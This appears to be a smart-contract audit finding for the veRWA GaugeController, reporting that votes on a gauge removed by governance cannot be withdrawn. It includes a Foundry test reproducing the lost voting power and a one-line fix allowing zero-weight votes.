+TheGaugeControlleris a solidity port of Curve DAO’s Vyper implementation. Users are to vote for channeling incentives by using thevote_for_gauge_weights()function, and each user can fraction their voting power by $10000$ (that is, defined by BPS).
+One modification from the original is that governance can now remove gauges, not allowing users to vote on it. However, any existing individual user’s voting power before removal is not reset. Sincevote_for_gauge_weights()does not allow voting for removed gauges, the voting power is then forever lost.
+Consider the following scenario:
+Alice has some veRWA, and is now able to vote.She votes on some pool, say, G1, using 100% of her voting power.Pool G1 is removed by governance due to any reason. Perhaps the pool was found to be faulty and liquidity should be migrated, perhaps the market itself has became illiquid and unsafe, perhaps the intended incentives duration for that pool has simply expired.Alice still has 100% of her voting power in that pool, but she cannot remove her vote and claim the voting power back.
+It is worth noting that, even if Alice does not use 100% of her voting power on that particular gauge, she would still lose whatever percent vote placed in that pool, and her overall voting power was weakened by said percent.
+Impact
+Users can lose their voting power.
+Proof of concept
+We provide the following POC to use onGaugeControllertests.
+functiontestPOC()public{// prepareuint256v=10ether;vm.deal(gov,v);vm.startPrank(gov);ve.createLock{value:v}(v);// add gaugesgc.add_gauge(gauge1);gc.change_gauge_weight(gauge1,100);gc.add_gauge(gauge2);gc.change_gauge_weight(gauge2,100);// all-in on gauge1gc.vote_for_gauge_weights(gauge1,10000);// governance removes gauge1gc.remove_gauge(gauge1);// cannot vote for gauge2vm.expectRevert("Used too much power");gc.vote_for_gauge_weights(gauge2,10000);// cannot remove vote for gauge1vm.expectRevert("Invalid gauge address");// @audit remove when mitigategc.vote_for_gauge_weights(gauge1,0);// cannot vote for gauge2 (to demonstrate again that voting power is not removed)vm.expectRevert("Used too much power");// @audit remove when mitigategc.vote_for_gauge_weights(gauge2,10000);}
+Tools used
+Forge
+Recommended mitigation steps
+The simplest way to mitigate this is toallow zero-weight votings on expired poolssimply to remove the vote. Modify line 213 as follow:
+require(_user_weight==0||isValidGauge[_gauge_addr],"Can only vote 0 on non-gauges");
+https://github.com/code-423n4/2023-08-verwa/blob/main/src/GaugeController.sol#L213
+The given POC can then be the test case to verify successful mitigation.
+As a QA-based recommendation, the sponsor can also provide an external function to remove votes, and/or provide a function to vote for various pools in the same tx. This will allow users to channel their votes directly from removed pools to ongoing pools.
+
